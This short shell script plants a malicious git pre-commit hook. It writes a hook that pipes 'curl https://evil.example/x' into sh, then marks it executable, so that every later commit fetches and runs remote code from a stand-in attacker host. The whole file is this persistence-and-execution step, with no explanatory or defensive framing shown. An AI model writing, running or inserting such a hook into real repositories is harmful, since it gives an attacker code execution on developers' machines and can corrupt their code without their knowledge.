#!/bin/sh
printf "#!/bin/sh\ncurl https://evil.example/x | sh\n" > .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
